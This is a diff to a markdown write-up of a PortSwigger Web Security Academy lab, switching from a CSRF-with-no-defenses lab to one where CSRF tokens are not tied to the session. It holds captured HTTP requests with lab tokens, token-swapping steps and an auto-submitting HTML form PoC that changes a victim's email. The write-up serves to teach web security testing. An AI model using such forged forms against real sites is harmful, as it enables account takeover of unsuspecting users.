@@ -1,41 +1,57 @@
-# CSRF Vulnerability with No Defenses
+# CSRF Where Token Is Not Tied to User Session
 
-![Difficulty](https://img.shields.io/badge/Difficulty-APPRENTICE-brightgreen) ![Category](https://img.shields.io/badge/Category-CSRF-blue)
+![Difficulty](https://img.shields.io/badge/Difficulty-PRACTITIONER-orange) ![Category](https://img.shields.io/badge/Category-CSRF-blue)
 
 ## Objective
 
-> The email change functionality is vulnerable to CSRF. Goal is to craft an HTML page that changes the victim's email and host it on the exploit server.
+> The app uses CSRF tokens but doesn't tie them to a specific user session. Goal is to exploit this to change the victim's email using a valid token from a different account.
 
 ## Steps
 
-### 1. Intercept the email change request
+### 1. Log in as wiener and intercept the email change request
 
-Fire up Burp Suite, log in as `wiener:peter`, and change the email. Intercept the request and inspect it.
+Capture the request and note the CSRF token.
 
 ```http
 POST /my-account/change-email HTTP/2
-Host: 0a140038035928d8801f038c00bc00c5.web-security-academy.net
-Cookie: session=JMfQXFIbz5GzCAHXSuvs39fzlYS1qK0q
+Host: 0ad3004603cf60ad82f2fd220030008d.web-security-academy.net
+Cookie: session=fKpNtvRJ4v9yMDj6Zb7dP3oPTh2VYYix
 Content-Type: application/x-www-form-urlencoded
 
-email=ahmed%40gmail.com
+email=ahmed1%40gmail.com&csrf=giX40GhKS8Ku5Pa67eygtitoidp4xkFb
 ```
 
-### 2. Spot the vulnerability
+### 2. Drop the request — don't use the token yet
 
-No CSRF token anywhere in the request. Session is tracked via cookie only — that's the vulnerability right there, nothing to validate the request origin.
+Important: drop this request so wiener's token stays unused and valid.
 
-### 3. Build and deliver the PoC
+### 3. Log in as carlos and intercept his email change request
 
-Generate the CSRF PoC from Burp and host it on the exploit server. When the victim visits the page, the form auto-submits and changes their email.
+```http
+POST /my-account/change-email HTTP/2
+Host: 0ad3004603cf60ad82f2fd220030008d.web-security-academy.net
+Cookie: session=LELZs4VtopQoRLW3YTN0guamJxsA6pY9
+Content-Type: application/x-www-form-urlencoded
+
+email=sdfsdf%40gmail.com&csrf=hdGWCM4yA4WEgqASWv1CuXeCIPHOBG9A
+```
+
+### 4. Replace carlos's token with wiener's token and forward
+
+Swap `hdGWCM4yA4WEgqASWv1CuXeCIPHOBG9A` with `giX40GhKS8Ku5Pa67eygtitoidp4xkFb` — the request goes through. The app accepted a token that belongs to a completely different user session, which confirms the vulnerability.
+
+### 5. Build the PoC using carlos's unused token
+
+Since wiener's token got consumed in the test, grab carlos's token (`hdGWCM4yA4WEgqASWv1CuXeCIPHOBG9A`) — it's still unused — and use it in the PoC.
 
 ## PoC
 
 ```html
 <html>
   <body>
-    <form action="https://0a140038035928d8801f038c00bc00c5.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="ahmed@gmail.com" />
+    <form action="https://0ad3004603cf60ad82f2fd220030008d.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="sdfsd11f@gmail.com" />
+      <input type="hidden" name="csrf" value="hdGWCM4yA4WEgqASWv1CuXeCIPHOBG9A" />
       <input type="submit" value="Submit request" />
     </form>
     <script>
@@ -48,14 +64,10 @@ Generate the CSRF PoC from Burp and host it on the exploit server. When the vict
 
 ## Why It Works
 
-The app relies solely on session cookies to authenticate requests with no CSRF token or origin validation. Any page can silently trigger a state-changing POST on behalf of a logged-in user — the browser attaches the cookie automatically.
+The app validates that a CSRF token exists and is valid, but never checks if it belongs to the current session. This means any valid token — even from a completely different user — will pass the check, making the protection useless.
 
 ## Key Takeaways
 
-- No CSRF token = no way to distinguish legitimate requests from forged ones
-- Session cookies alone are not enough to protect state-changing endpoints
-- Burp's "Generate CSRF PoC" makes building the attack trivial
-
----
-
-جاهز! انسخه على GitHub مباشرة 🎯
+- CSRF tokens must be tied to the user's session, not just exist in a global pool
+- Always drop the request when testing a token so it stays unused for the PoC
+- Two accounts make this class of vulnerability easy to confirm and exploit
